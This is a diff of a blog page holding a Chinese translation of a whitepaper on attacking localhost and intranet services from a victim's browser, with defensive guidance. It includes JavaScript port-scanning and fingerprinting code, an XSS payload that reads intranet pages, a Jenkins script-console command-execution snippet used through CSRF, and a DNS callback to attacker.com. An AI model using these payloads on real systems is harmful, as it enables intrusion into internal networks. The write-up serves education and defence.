@@ -304,7 +377,7 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 <p>默认情况下，路由器通常使用子网中最低的IP地址。例如，在 192.168.1.0/24 子网上，路由器的 IP 地址为 192.168.1.1 是一个非常合理的假设。</p>
 <p>此外，我们甚至不必知道 IP 地址，我们也可以猜出合理的主机名，例如 <a href="http://bugzilla.targetorg.com">http://bugzilla.targetorg.com</a> 或 <a href="http://wiki.targetorg.com">http://wiki.targetorg.com</a> 。其他潜在的主机名可能是例如 intranet &hellip;，mail &hellip;，printer &hellip;，jenkins &hellip;，git &hellip;等。这些名称将由受害者的浏览器使用目标组织的内部 DNS 服务器解析为 IP 地址。</p>
 <p>查找内部主机的另一个选择是通过其他方式获取有关内部服务的情报。在目标攻击中最常见的是，攻击者可以通过诸如垃圾箱潜伏，社会工程，获得内鬼的帮助，网页信息泄露等手段来查找信息。</p>
-<h3 id="通过端口扫描验证主机是否存在">通过端口扫描验证主机是否存在</h3>
+<h3 id="通过端口扫描验证主机是否存在">通过端口扫描验证主机是否存在 <a class="heading-anchor" href="#%e9%80%9a%e8%bf%87%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e9%aa%8c%e8%af%81%e4%b8%bb%e6%9c%ba%e6%98%af%e5%90%a6%e5%ad%98%e5%9c%a8" aria-label="链接到本节">#</a></h3>
 <p>在攻击阶段，我们有一个合理的 IP 地址列表，包括 localhost，以及一些合理的潜在主机名。我们的下一步将是验证我们的哪些猜测是正确的。验证将通过端口扫描这些主机来完成。请记住，我们对主机本身不感兴趣，而是对它们可能拥有的任何开放端口和运行服务感兴趣。</p>
 <p>如果尝试使用 HTTP 连接到这些主机，同源策略会阻止任意可以读取响应的 JavaScript ，因此通过直接连接到特定端口来检查它否打开将不起作用。</p>
 <p>但是，仍有一种方法可以推断出端口是否开放。我们可以通过 JavaScript 尝试从主机的端口加载图片来验证端口是否开放。如果 onerror 或 onload 事件触发，则端口可能是打开的，如果超时，则端口是关闭的。</p>
@@ -379,13 +452,14 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>当受害者访问这个页面是，我们将获得：</p>
-<p><img src="https://s2.ax1x.com/2019/04/08/A4W87q.png" alt="A4W87q.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4W87q.png" alt="A4W87q.png" loading="lazy" decoding="async">
+</p>
 <p><strong>图例 2</strong>: 使用 JavaScript 端口扫描的结果</p>
 <p>targetorg.com 域存在于我们的实验室网络中，通过受害者的浏览器使用目标的内部 DNS 服务器来完成对于这些名称的 DNS 查询。对于攻击其他组织，我们可以将 “targetorg.com” 替换为合适的域名，否则我们可以尝试例如 &lsquo;printer&rsquo;，没有任何域名，让受害者的 DNS 解析器自动添加正确的域名。</p>
 <p>我们可以轻松地修改概念验证（PoC）以将结果发回给我们（不展示此代码），我们可以对结果进行一些分析。我们现在知道主机 wiki.targetorg.com 不太有用，因为它的 HTTP 端口已关闭或主机不存在。 标记为开放的端口可能很有趣，因此我们可以对于这些端口做指纹识别，引导我们进入下一阶段的攻击&hellip;&hellip;</p>
 <blockquote>
 <p>注意：值得一提的资源是 LocalNetworkScanner 项目。它获取本地 IP 地址，然后通过端口扫描本地以及周围的 C 段的地址。该项目的源代码在 Github [17] 上，还有一个实时版本 [18]。对于某些浏览器，它可以正确地找到许多内部主机，但是不同的浏览器会有所不同。</p></blockquote>
-<h3 id="使用默认文件查找在开放端口上运行的服务">使用默认文件查找在开放端口上运行的服务</h3>
+<h3 id="使用默认文件查找在开放端口上运行的服务">使用默认文件查找在开放端口上运行的服务 <a class="heading-anchor" href="#%e4%bd%bf%e7%94%a8%e9%bb%98%e8%ae%a4%e6%96%87%e4%bb%b6%e6%9f%a5%e6%89%be%e5%9c%a8%e5%bc%80%e6%94%be%e7%ab%af%e5%8f%a3%e4%b8%8a%e8%bf%90%e8%a1%8c%e7%9a%84%e6%9c%8d%e5%8a%a1" aria-label="链接到本节">#</a></h3>
 <p>此时我们有一个稍微缩减的（可能）开放端口列表，因为我们能够从我们一开始猜测的主机/端口列表中删除一部分。我们的下一步是找出在这些端口上运行的服务。</p>
 <p>同源策略让我们再一次变得盲目，但是找出端口后面运行的服务可以通过使用类似于我们进行端口扫描的技术来完成。一个额外的区别将是尝试找到特定的图像文件。如果 onload 事件触发，我们知道服务器上存在特定的图片文件（尽管我们的 JavaScript 无法访问它）。相反，如果触发了 onerror 事件，则所寻找的图像不存在。因此，即使由于同源策略 JavaScript 无法读取页面，它仍然可以确定差异。</p>
 <p>对于指纹识别，让我们利用我们现在所掌握的来确定特定图像是否存在。不同的 Web 应用程序通常具有自己的一组默认文件。例如，如果文件 http//xx.xx.xx.xx/images/jenkins.png 存在，则相关服务可能是 Jenkins 构建服务器。</p>
@@ -423,7 +497,8 @@ scan(resultElem,hostport,&#39;cisco router&#39;,&#39;/themes/img/speciel/ciscobg
 scan(resultElem,hostport,&#39;seagate&#39;,&#39;/assets/img/Logo_Seagate_White.png&#39;); 
 scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 </code></pre><p>当受害者访问我们的恶意页面时，结果是：</p>
-<p><img src="https://s2.ax1x.com/2019/04/08/A4WL8S.png" alt="A4WL8S.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4WL8S.png" alt="A4WL8S.png" loading="lazy" decoding="async">
+</p>
 <p><strong>图例 3</strong>: 本地以及本地局域网上服务的指纹</p>
 <p>再一次，结果将被发送给攻击者。主机 printer.targetorg.com 和 192.168.1.102 可能是同一台主机，因为根据指纹识别它们似乎都是 Lexmark 打印机。intranet.targetorg.com 和 192.168.1.100 可能也是同一个主机。</p>
 <blockquote>
@@ -431,11 +506,12 @@ scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 <p>现在，让我们退后一步，看看到目前为止我们获取了那些。面对同源策略，我们已经成功从公网通过指纹识别出内网上九台主机上运行的服务，包括 localhost。这是我们攻击侦察部分的总结。</p>
 <blockquote>
 <p>注意：出于教学目的，我们在执行侦察时使用了多个恶意网页。在实践中，真正的攻击者可能准备一个能在页面中执行所有这些步骤的恶意网页，只需要受害者单击即可。</p></blockquote>
-<h2 id="通过-xss-浏览内部网络并更改页面源origin">通过 XSS 浏览内部网络并更改页面源(origin)</h2>
+<h2 id="通过-xss-浏览内部网络并更改页面源origin">通过 XSS 浏览内部网络并更改页面源(origin) <a class="heading-anchor" href="#%e9%80%9a%e8%bf%87-xss-%e6%b5%8f%e8%a7%88%e5%86%85%e9%83%a8%e7%bd%91%e7%bb%9c%e5%b9%b6%e6%9b%b4%e6%94%b9%e9%a1%b5%e9%9d%a2%e6%ba%90origin" aria-label="链接到本节">#</a></h2>
 <p>到目前为止，我们已经讨论过同源策略如何只允许我们发送请求，而不能读取响应。作为一个绕过步骤，让我们看看一个边缘情况，即使在同源策略完全生效的情况下，我们也可以读取响应 - 也就是说，缺少跨域资源共享可以减少同源策略施加的限制。读取响应的能力基本上允许我们使用受害者的浏览器作为代理从外部浏览受害者的内部网络。</p>
 <p>同源策略不会阻止从同一个源的读取页面，并且页面可能会更改其自己的源，以便能够与子域 [21] 进行通信。例如，如果 <a href="http://targetorg.com">http://targetorg.com</a> 已配置为能够与 <a href="http://intranet.targetorg.com">http://intranet.targetorg.com</a> 通信，那么如果我们能够在 targetorg.com 上运行 JavaScript 代码，我们可以像攻击者一样。 <a href="http://targetorg.com">http://targetorg.com</a> 上的跨站脚本（XSS）漏洞可能允许这个场景。</p>
 <p>在用于我们设置的实验室环境中，我们将 targetorg.com 的 DNS 指向公共 IP 地址，因此，它可供攻击者（即我们）进行实验。攻击者在 <a href="http://targetorg.com">http://targetorg.com</a> 网站上发现了一个 XSS 漏洞：</p>
-<p><img src="https://s2.ax1x.com/2019/04/08/A4WxDs.png" alt="A4WxDs.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4WxDs.png" alt="A4WxDs.png" loading="lazy" decoding="async">
+</p>
 <p><strong>图例 4</strong>: <a href="http://targetorg.com">http://targetorg.com</a> 上的 XSS</p>
 <p>HTML 的源代码为：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
@@ -457,17 +533,19 @@ scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;http://targetorg.com/?inject=var%20iframe%20%3d%20document.createElement(%27 iframe%27);%20iframe.src%20%3d%20%27http://intranet.targetorg.com%27;%20iframe.onload%20%3d%20function(e)%20%7b%20alert(%27Sending%20contents%20of%20intra net.targetorg.com%20to%20attacker:%20%27%20+%20iframe.contentWindow.document. documentElement.outerHTML);%20%7d;%20document.body.appendChild(iframe);&#39;</span>; 
 </span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">theiframe</span>);
 </span></span></code></pre></div><p>当受害者浏览我们的恶意 URL，结果是：</p>
-<p><img src="https://s2.ax1x.com/2019/04/08/A4fl8O.png" alt="A4fl8O.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4fl8O.png" alt="A4fl8O.png" loading="lazy" decoding="async">
+</p>
 <p><strong>图例 5</strong>: 通过公网服务器上的 JavaScript 浏览受害者的内网。</p>
 <p>图例 5 中的截图显示 JavaScript 确实可以访问内网的内容，而不仅仅是在 iframe中 显示它。因此，它也可以将其发送给攻击者。外部 iframe 可以在 targetorg.com 的同源内运行，并且可以访问来自 intranet.targetorg.com 的内部 iframe 的数据。 从本质上讲，这允许我们浏览受害者的内网，查看他们的内网网页。</p>
 <blockquote>
 <p>注意：攻击生效的条件之一是 targetorg.com 和 intranet.target.org 页面都定义了 &lsquo;document.domain = &ldquo;targetorg.com&rdquo;&rsquo;，就同源策略而言，它们位于相同源。</p></blockquote>
 <p>另一种可能的攻击情形可能是受害者在 passwords.targetorg.com 上有一个密码服务器。然后，如果受害者在登录到密码服务器时浏览我们的恶意 HTML/JavaScript 页面，我们可能能够读取密码。</p>
-<h2 id="攻击本地运行的-jenkins">攻击本地运行的 Jenkins</h2>
+<h2 id="攻击本地运行的-jenkins">攻击本地运行的 Jenkins <a class="heading-anchor" href="#%e6%94%bb%e5%87%bb%e6%9c%ac%e5%9c%b0%e8%bf%90%e8%a1%8c%e7%9a%84-jenkins" aria-label="链接到本节">#</a></h2>
 <p>在展示如何通过绕过步骤浏览 targetorg.com 的内网时，让我们回到通过公网攻击内网服务的任务中。</p>
-<h3 id="用我们的-jenkins-实例做实验">用我们的 Jenkins 实例做实验</h3>
+<h3 id="用我们的-jenkins-实例做实验">用我们的 Jenkins 实例做实验 <a class="heading-anchor" href="#%e7%94%a8%e6%88%91%e4%bb%ac%e7%9a%84-jenkins-%e5%ae%9e%e4%be%8b%e5%81%9a%e5%ae%9e%e9%aa%8c" aria-label="链接到本节">#</a></h3>
 <p>从我们之前做过的侦察中，我们有可以明确推断出有一个 Jenkins 实例运行在 http://127.0.0.1:8080 。作为攻击者，我们可以设置我们自己的 Jenkins 实例并进行一些实验以准备攻击。Jenkins 有一个可用于执行脚本甚至操作系统命令脚本控制台：</p>
-<p><img src="https://s2.ax1x.com/2019/04/08/A4f3xe.png" alt="A4f3xe.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4f3xe.png" alt="A4f3xe.png" loading="lazy" decoding="async">
+</p>
 <p><strong>图例 6</strong>: Jenkins 脚本控制台</p>
 <p>对于执行操作系统命令，我们可以在脚本控制台中输入以下内容并点击运行 [22]：</p>
 <pre tabindex="0"><code>def sout = new StringBuffer(), serr = new StringBuffer() 
@@ -475,18 +553,18 @@ def proc = &#39;&lt;SOME_COMMAND&gt;&#39;.execute()
 proc.consumeProcessOutput(sout, serr) 
 proc.waitForOrKill(1000)
 println &#34;out&gt; $sout err&gt; $serr&#34;
-</code></pre><h3 id="选择攻击方式">选择攻击方式</h3>
+</code></pre><h3 id="选择攻击方式">选择攻击方式 <a class="heading-anchor" href="#%e9%80%89%e6%8b%a9%e6%94%bb%e5%87%bb%e6%96%b9%e5%bc%8f" aria-label="链接到本节">#</a></h3>
 <p>作为攻击者，我们可以制作提交上述表单的恶意 JavaScript。注意由于同源策略的限制，此 JavaScript 将无法读取响应。但是，系统命令仍将执行，这足以攻击服务。稍后，我们将研究如何在无法读取响应的情况下验证命令的执行。
  
 根据配置，访问脚本控制台可能需要也可能不需要身份验证。即使需要身份验证，我们仍然可以通过 CSRF 访问脚本控制台，只要用户当前登录到 Jenkins 即可。原因是浏览器会在我们的请求中添加任何身份验证 cookie（如果我们设置 &lsquo;request.withCredentials = true;&rsquo;） - 攻击者不需要知道它们。重要的是 Jenkins 是否配置了 CSRF 保护。</p>
 <p>通常，人们会尝试安全地配置对外开放的服务器，但往往忽视内部服务器的安全性。对于本地服务而言，这种疏忽通常更为明显，基于主机的防火墙（有缺陷的）阻止访问是有理由的。因此，很有可能找到没有进行安全配置的 Jenkins 实例。考虑到这一点，假设 Jenkins 实例未配置 CSRF 保护，让我们准备一次攻击。</p>
 <blockquote>
 <p>注意：我们不会发布任何 Jenkins 零日漏洞，我们利用的不安全配置是一个已知问题（在非默认配置中）[23]。我们本可以选择任何漏洞，但决定使用 Jenkins 作为说明性示例。</p></blockquote>
-<h3 id="通过-dns-验证命令盲注技术">通过 DNS 验证命令盲注技术</h3>
+<h3 id="通过-dns-验证命令盲注技术">通过 DNS 验证命令盲注技术 <a class="heading-anchor" href="#%e9%80%9a%e8%bf%87-dns-%e9%aa%8c%e8%af%81%e5%91%bd%e4%bb%a4%e7%9b%b2%e6%b3%a8%e6%8a%80%e6%9c%af" aria-label="链接到本节">#</a></h3>
 <p>简略起见，为了避免在受害者上遗留建立持久化连接的细节，让我们验证注入的命令是否实际运行。一个通常能否验证盲注情形中命令的执行情况的简单的方法是让受害者向攻击者控制的 DNS 服务器发出 DNS 请求。在我们的设置中，我们可以控制 attacker.com 域的 DNS 服务器。因此，让我们将以下命令注入 Jenkins 脚本控制台：<code>host abc123.attacker.com</code>。 通过查看 DNS 查询日志，我们可以简单地从目标网络外部的位置验证系统命令实际运行情况。</p>
 <blockquote>
 <p>注意：此验证不依赖于受害者能够直接访问 attacker.com 域的 DNS 服务器。相反，会发生这种情况：当受害者运行 JavaScript 时，Jenkins 将运行系统命令，这将导致 DNS 查询被发送到受害者的内部 DNS 服务器，后者将转发它，并最终发送给 attacker.com 域的权威 DNS 服务器。（基本上，阻止这种情况的唯一方法是完全阻止 DNS 查询，这是很难实现的。）</p></blockquote>
-<h3 id="执行攻击并进行验证">执行攻击并进行验证</h3>
+<h3 id="执行攻击并进行验证">执行攻击并进行验证 <a class="heading-anchor" href="#%e6%89%a7%e8%a1%8c%e6%94%bb%e5%87%bb%e5%b9%b6%e8%bf%9b%e8%a1%8c%e9%aa%8c%e8%af%81" aria-label="链接到本节">#</a></h3>
 <p>我们攻击 Jenkins 的恶意 HTML/JavaScrip 会是这样：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
@@ -512,7 +590,7 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 <p>看到这一条 DNS 记录证明我们的命令注入已经成功总受害者机器上执行！</p>
 <blockquote>
 <p>注意：在实践中，真正的攻击者可能宁愿执行一些命令来获取并运行一些代码，这些代码在受害者和攻击者之间建立命令和控制（C2）通道。 然而，就本白皮书而言，我们仅限于证明命令注入。</p></blockquote>
-<h2 id="简要的攻击链分析">简要的攻击链分析</h2>
+<h2 id="简要的攻击链分析">简要的攻击链分析 <a class="heading-anchor" href="#%e7%ae%80%e8%a6%81%e7%9a%84%e6%94%bb%e5%87%bb%e9%93%be%e5%88%86%e6%9e%90" aria-label="链接到本节">#</a></h2>
 <p>回过头从全局角度来看，我们发现我们能够在面对同源策略的情况下，在公网找到并攻击在内网上运行的易受攻击的服务。通过使用受害者的浏览器作为代理，我们能够在此过程中完全绕过企业防火墙和基于主机的防火墙。</p>
 <p>此外，此次攻击并没有利用代码中的漏洞。攻击的每一步都依赖于按预期工作的事情（除了我们在 Jenkins 中的故意配置问题导致它有 CSRF 漏洞）。这反过来意味着即使将防火墙，浏览器和 Jenkins 更新到最新版本将无法抵御攻击。（对我们的示例攻击的适当保护是对 Jenkins 进行更安全的设置。）</p>
 <p>如何“浏览”内网的演示确实依赖于 XSS 漏洞，但这与攻击 Jenkins 无关。
@@ -523,7 +601,7 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 <li>由于不能依赖受害者长时间停留在恶意页面上，因此攻击者很难根据可能推断出的内部网络信息来调整攻击。如前所述，攻击者有时使用成人材料诱使受害者在页面上停留足够长的时间。）</li>
 </ol>
 <p>为了解决这两个问题，增加攻击成功的可能性，攻击者可以同时对大量服务进行通用攻击（而不是像我们那样只攻击 Jenkins）。攻击者可能提前准备一个包含 JavaScript 的恶意网页，用于对内网中常见的各种服务进行大量不同类型的攻击，例如开发人员工作站上的 Jenkins，多个不同路由器的漏洞等等。虽然大多数攻击都会失败，但如果有足够多的受害者，一些攻击会成功，从攻击者的角度来看，这可能已经足够好了。</p>
-<h2 id="本地可疑行为的检测表示本地攻击">本地可疑行为的检测表示本地攻击</h2>
+<h2 id="本地可疑行为的检测表示本地攻击">本地可疑行为的检测表示本地攻击 <a class="heading-anchor" href="#%e6%9c%ac%e5%9c%b0%e5%8f%af%e7%96%91%e8%a1%8c%e4%b8%ba%e7%9a%84%e6%a3%80%e6%b5%8b%e8%a1%a8%e7%a4%ba%e6%9c%ac%e5%9c%b0%e6%94%bb%e5%87%bb" aria-label="链接到本节">#</a></h2>
 <p>对这些攻击实施检测/保护的最有效的地方可能是浏览器本身。由于浏览器不能完全保护我们，并且由于只有浏览器供应商可以控制浏览器功能路线图，因此我们来说的其它的下一个最佳选择可能是通过能够规范化/反混淆恶意代码并检测和防止这些攻击的 Web 代理来浏览网页。</p>
 <p>如果没有可以保护我们的 Web 代理（或更安全的浏览器默认值），我们应该至少能够检测到这些攻击。安全界的一句话说“预防是理想的，但检测是必须的”。这同样适用于我们讨论过的本地攻击。</p>
 <p>出于检测目的，最大的危险信号是外部托管的 JavaScript/网页尝试连接私有 IP 地址。我们可以使用网络流量分析技术来检测这种可疑行为，尽管这种方法也会出现一些误报。</p>
@@ -544,9 +622,9 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 <li>在内网发送大量响应为 HTTP/404 的 HTTP 请求之后与外部 web 服务器的连接可能表示恶意 JavaScript 对开放端口上的服务做指纹识别。</li>
 </ul>
 <p>如果不限制仅进行网络流量分析，对于检测有更多选项。例如，终端代理可以潜在地向网络安全设备（例如防火墙）提供关于哪个网页生成特定请求的信息，极大地增强网络安全设备的决策能力。</p>
-<h2 id="防护">防护</h2>
+<h2 id="防护">防护 <a class="heading-anchor" href="#%e9%98%b2%e6%8a%a4" aria-label="链接到本节">#</a></h2>
 <p>你自己如何防护本地攻击呢？没有能够实现完全防护的银弹，但是你可以从一些小事来降低你面临的攻击面。</p>
-<h3 id="对于不同角色人群的防护建议">对于不同角色人群的防护建议</h3>
+<h3 id="对于不同角色人群的防护建议">对于不同角色人群的防护建议 <a class="heading-anchor" href="#%e5%af%b9%e4%ba%8e%e4%b8%8d%e5%90%8c%e8%a7%92%e8%89%b2%e4%ba%ba%e7%be%a4%e7%9a%84%e9%98%b2%e6%8a%a4%e5%bb%ba%e8%ae%ae" aria-label="链接到本节">#</a></h3>
 <p><strong>对于典型的家庭用户</strong>, 你次要做一件最重要的事情是为你的家庭路由器安装任何新的补丁。此外，你可能需要考虑将路由器的 IP 地址更改为默认值以外的其他地址（通常为 192.168.0.1 或 192.168.1.1）。一般都要警惕灰色网站。众所周知，攻击者会将恶意网页上的成人资料作为诱饵 [25]。在本地攻击的情况下，成人材料可能会诱使受害者留在网站上足够长的时间以使攻击者对内部网络进行攻击。</p>
 <p><strong>对于开发者</strong>, 你可以做的最重要的事情是确保你的软件能够抵御 CSRF 攻击。 可以在网络上 [26] 上找到实现 CSRF保护 的入门指南。此外，开发人员通常需要运行普通用户不需要的各种服务，例如数据库，Jenkins 等。确保这些服务不易受到 CSRF攻 击，并且通常安全地配置它们。（这些服务的安全配置可能比安装最新补丁更重要。在作者的渗透测试经验中，由于配置不安全而导致系统崩溃，相对于缺少补丁来说更常见。）</p>
 <p><strong>对于网络管理员，IT 产品经理和开发人员</strong>需要意识到，基于主机的防火墙和外围防火墙都不足以完全阻止远程利用。甚至在 localhost 或内网中运行的服务也可能遭受通过从公网加载的恶意 JavaScript 的攻击，因此必须充分保护这些服务。特别是，服务需要抵御 CSRF 攻击。此外，在进行威胁建模时，应考虑到本地/内部服务可能也可以接收外部恶意输入。</p>
@@ -555,14 +633,14 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 <p><strong>对于 Web 开发人员</strong>应该意识到如果不同子域之间共享相同的源，则一个子域上的 XSS 漏洞可能会传递到到另一个子域，不仅允许编辑请求，还允许攻击者读取（即浏览）。只有在真正需要时才共享源，并确保你不在外部和内部 Web 服务器之间共享源。</p>
 <p><strong>对于隐私最重要的情形</strong>并且使用 TOR 网络用于通信的情况，请确保不要更改不允许浏览器连接到 localhost 和本地局域网的默认配置。允许与本地网络的连接可能用于对 TOR 用户进行去匿名化，例如通过向易受攻击的路由器发出 CSRF 请求，要求它向某个外部站点发出 ping 请求，从而显示公共 IP 地址。</p>
 <p>通常<strong>对于终端用户</strong>：即使对于在 localhost/内部运行的服务（尤其是对于 HTTP/HTTPS 接口），也要使用身份验证，如果可能，最好使用多因素身份验证（MFA），或者设置强密码。完成服务使用后应注销：即使需要强身份验证，如果受害者在当前登录某服务时浏览到恶意站点，该服务可能会受到攻击，因为该服务易受 CSRF 攻击。最后要注意的是，在浏览器中关闭 JavaScript 并不足以抵御本地攻击，因为可以使用简单的 GET 请求（普通 HTTP 链接）或使用 HTML 表单执行某些 CSRF 攻击，而不需要任何 JavaScript。</p>
-<h3 id="确保你的应用无法攻击其它应用">确保你的应用无法攻击其它应用</h3>
+<h3 id="确保你的应用无法攻击其它应用">确保你的应用无法攻击其它应用 <a class="heading-anchor" href="#%e7%a1%ae%e4%bf%9d%e4%bd%a0%e7%9a%84%e5%ba%94%e7%94%a8%e6%97%a0%e6%b3%95%e6%94%bb%e5%87%bb%e5%85%b6%e5%ae%83%e5%ba%94%e7%94%a8" aria-label="链接到本节">#</a></h3>
 <p>虽然 CSRF 防护旨在确保你的应用程序无法成功受到攻击，但还需要采取另一项措施来确保你的应用程序无法攻击其他应用程序（例如通过某些 XSS 漏洞）。对此的一个很好的方法是内容安全策略（CSP），它将阻止对本地主机/内部网络的许多攻击。 CSP 是一种白名单方法，允许你配置允许应用程序与之通信的主机。可以在网上找到几个很好的 CSP 介绍 [27]。
  
 为什么你甚至需要关心通过添加 CSP 头来确保你的应用程序无法攻击其他应用程序？例如，如果攻击者发现你站点中存在某些 XSS 漏洞，他可以利用受害者对你站点的信任，注入一些对本地主机/内部网络进行攻击的 JavaScript，除非 CSP 阻止他这样做。</p>
 <p>但请注意，CSP 不是可以起到所有防御作用：例如，使用 HTTP 302/Location HTTP 头的重定向将不符合 CSP 配置。绕过 CSP 规则的其他示例也存在于 [28] [29] [30]。出于这个原因，CSP 本身并没有提供完美的保护，尽管它确实使攻击更加困难。</p>
-<h3 id="对于防护的总结">对于防护的总结</h3>
+<h3 id="对于防护的总结">对于防护的总结 <a class="heading-anchor" href="#%e5%af%b9%e4%ba%8e%e9%98%b2%e6%8a%a4%e7%9a%84%e6%80%bb%e7%bb%93" aria-label="链接到本节">#</a></h3>
 <p>我们知道，在所有情况下实行上述所有建议可能并不实际，可能是由于资源有限，浏览器默认设置或供应商未对易受攻击的设备进行修复。我们建议对于这些情况至少实施检测。</p>
-<h2 id="总结">总结</h2>
+<h2 id="总结">总结 <a class="heading-anchor" href="#%e6%80%bb%e7%bb%93" aria-label="链接到本节">#</a></h2>
 <p><em>我们已经展示了一个攻击链，这些攻击即使面对防火墙也能从公网发起攻击：通过受害者浏览器，你可以在内网查找主机和开放端口，对开放端口做指纹识别并最终利用它们。此攻击链工作所需的唯一安全问题是，要利用的服务容易受到 CSRF</em> 的攻击。除此之外，攻击的每一步都依赖于按照预期工作的事情。</p>
 <p>除了描述这些攻击的技术细节之外，我们还讨论了检测它们的方法，并给出了减少攻击面的建议。</p>
 <p>显然，现代 Web 浏览器不能很好的防护从公网发起使用受害者的浏览器作为代理访问内网的攻击。此外，使用受害者的浏览器作为代理不仅会绕过外围防火墙，还会绕过任何基于主机的防火墙。防火墙可能会记录从外部站点获取恶意 JavaScript，但对内网的后续攻击甚至不会通过外围防火墙。</p>
@@ -574,7 +652,7 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 <p>此外，我们还展示了如果外部和内部 Web 服务器共享相同的源，攻击者可能如何在内部网络上浏览某些站点。</p>
 <p>最后，我们要强调的是，我们在本白皮书中展示的攻击应该成为提高内部网络安全性的理由，无论是服务器还是工作站。处于侦察目的绕过同源策略，浏览内网的边缘情况以及通过 CSRF 攻击内部服务都强调了内部应用程序的安全性必须得到认真对待的事实。即使你信任你的用户不会攻击你，你自己的用户也不是你唯一关注的问题。</p>
 <p>除了前面概述的检测和保护技术措施之外，还需要对管理员和最终用户进行培训，特别强调内部安全非常重要。正如我们所示，外围防火墙完全保护内部网络，并且基于主机的防火墙完全保护本地服务是一个有缺陷的假设。</p>
-<h2 id="资源">资源</h2>
+<h2 id="资源">资源 <a class="heading-anchor" href="#%e8%b5%84%e6%ba%90" aria-label="链接到本节">#</a></h2>
 <p>[1]: <a href="https://www.slideshare.net/netsparker/hacking-vulnerable-websites-to-bypass-firewalls">https://www.slideshare.net/netsparker/hacking-vulnerable-websites-to-bypass-firewalls</a></p>
 <p>[2]: <a href="https://blog.beefproject.com/2014/03/exploiting-with-beef-bind-shellcode_19.html">https://blog.beefproject.com/2014/03/exploiting-with-beef-bind-shellcode_19.html</a></p>
 <p>[3]: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1663">https://bugs.chromium.org/p/project-zero/issues/detail?id=1663</a></p>
@@ -607,21 +685,23 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 <p>[30]: <a href="https://html5sec.org/minichallenges/3">https://html5sec.org/minichallenges/3</a></p>
 </article>
     <footer class="post-footer">
+      <div class="wechat-card">
         <p>欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：</p>
-        <img src="https://user-images.githubusercontent.com/12164075/133170982-62816554-7dd8-4e97-adbc-734f1df61e73.jpg" alt="mad_coder">
+        <img src="https://user-images.githubusercontent.com/12164075/133170982-62816554-7dd8-4e97-adbc-734f1df61e73.jpg" alt="mad_coder" loading="lazy" decoding="async">
+      </div>
       
       <ul class="post-tags">
         
-          <li><a href="https://madneal.com/tags/csrf"><span class="tag">CSRF</span></a></li>
+          <li><a href="https://madneal.com/tags/%E5%AE%89%E5%85%A8/"><span class="tag">安全</span></a></li>
         
-          <li><a href="https://madneal.com/tags/web%E5%AE%89%E5%85%A8"><span class="tag">Web安全</span></a></li>
+          <li><a href="https://madneal.com/tags/web%E5%AE%89%E5%85%A8/"><span class="tag">Web安全</span></a></li>
         
-          <li><a href="https://madneal.com/tags/xss"><span class="tag">XSS</span></a></li>
+          <li><a href="https://madneal.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span class="tag">漏洞分析</span></a></li>
         
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2622</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2623</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
@@ -636,7 +716,9 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 
 
 
-<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
+
+
+
 <script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config({
